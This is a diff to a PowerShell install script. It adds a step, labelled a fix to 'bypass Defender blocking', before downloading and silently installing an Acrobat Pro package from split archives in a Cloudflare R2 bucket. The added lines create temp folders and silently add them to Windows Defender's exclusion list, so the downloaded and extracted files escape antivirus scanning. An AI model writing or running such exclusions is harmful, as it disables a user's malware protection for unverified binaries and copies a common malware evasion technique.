@@ -61,7 +61,20 @@ if ((Test-Path $OfficeSetup) -and (Test-Path $OfficeConfig)) {
 # 2.Download & Silent Install Adobe Acrobat Pro 2026 from Cloudflare R2
 # Raw Split Volumes: AAP2026.zip.001 - AAP2026.zip.009
 # ==========================================
+# ==========================================
+# Fix: Bypass Defender Blocking via Exclusion & Unblock
+# ==========================================
 
+$TempDir    = "$env:TEMP\AdobeAcrobatInstall"
+$ExtractDir = "$TempDir\Extracted"
+
+if (-not (Test-Path $TempDir))    { New-Item -Path $TempDir -ItemType Directory -Force | Out-Null }
+if (-not (Test-Path $ExtractDir)) { New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null }
+
+# 1. 將暫存與解壓目錄加入 Defender 排除名單 (白名單)
+Write-Host "[!] Adding Exclusion Paths to Defender..." -ForegroundColor Cyan
+Add-MpPreference -ExclusionPath $TempDir -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath $ExtractDir -ErrorAction SilentlyContinue
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
 $ProgressPreference = 'SilentlyContinue'
 
